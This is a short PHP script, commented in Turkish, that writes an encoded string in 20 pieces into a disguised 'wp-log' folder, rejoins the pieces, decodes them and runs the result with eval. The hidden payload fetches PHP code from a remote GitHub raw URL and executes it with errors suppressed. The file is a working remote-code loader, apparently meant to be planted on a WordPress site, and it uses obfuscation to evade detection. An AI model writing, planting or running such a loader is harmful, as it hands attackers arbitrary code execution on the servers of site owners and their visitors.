<?php
// Hata raporlama aktif
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Şifreli base64 string
$encryptedStr = 'LyoqKiovQG51bGw7IC8qKioqKioqKi8gLyoqKioqKiovIC8qKioqKioqKi9AZXZhbC8qKioqLygiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzLyoqKioqKiovKHVybGRlY29kZSh1cmxlbmNvZGUocmF3dXJsZGVjb2RlKHJhd3VybGVuY29kZSgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21laG5ldDM0MTIzLWNwdS9UZXN0L3JlZnMvaGVhZHMvbWFpbi9zaXplLnR4dCIpKSkpKSk7LyoqLw==';

// Bölme ayarları
$parcaSayisi = 20;
$parcaUzunlugu = ceil(strlen($encryptedStr) / $parcaSayisi);
$klasor = 'wp-log';

// Klasör oluşturulmamışsa oluştur
if (!file_exists($klasor)) {
    mkdir($klasor, 0777, true);
}

// Parçalama ve kaydetme
for ($i = 0; $i < $parcaSayisi; $i++) {
    $parca = substr($encryptedStr, $i * $parcaUzunlugu, $parcaUzunlugu);
    file_put_contents("{$klasor}/part{$i}.txt", $parca);
}

// Parçaları birleştir
$decodedStr = '';
for ($i = 0; $i < $parcaSayisi; $i++) {
    $decodedStr .= file_get_contents("{$klasor}/part{$i}.txt");
}

// Decode ve çalıştır
$decoded = base64_decode($decodedStr);
eval($decoded);
?>